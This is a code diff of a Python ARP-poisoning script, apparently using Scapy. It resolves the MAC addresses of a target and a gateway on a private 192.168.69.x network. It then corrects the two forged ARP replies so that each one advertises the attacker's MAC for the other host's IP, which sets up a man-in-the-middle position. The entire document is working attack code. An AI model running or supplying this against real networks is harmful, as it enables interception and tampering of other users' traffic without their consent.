@@ -13,7 +13,7 @@ def checkProc():
 
 
 def poison(target, macaddr, gateway):
-    target = "192.168.69.111"
+    target = "192.168.69.112"
     gateway = "192.168.69.42"
 
     # find the address of both the target and the gateway
@@ -21,19 +21,19 @@ def poison(target, macaddr, gateway):
     
     # pick up the MAC address of the gateway for later
     getArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gateway)
-    response = srp(getArp, timeout=5)
+    response = srp(getArp, timeout=3)
     gatewayMac = response[0][0][1].hwsrc
     
     # now get the MAC address of our target
     getTgtArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target)
-    response = srp(getTgtArp, timeout=5)
+    response = srp(getTgtArp, timeout=3)
     targetMac = response[0][0][1].hwsrc
 
     # now send the gateway's details to the target
-    gatewaySpoof = ARP(op=2, psrc=gateway, pdst=target, hwdst=gatewayMac)
+    gatewaySpoof = ARP(op=2, psrc=target, pdst=gateway, hwsrc=macaddr)
 
     # then trick the target
-    targetSpoof = ARP(op=2, psrc=target, pdst=gateway, hwdst=targetMac)
+    targetSpoof = ARP(op=2, psrc=gateway, pdst=target, hwsrc=macaddr)
 
 
 if __name__ == "__main__":
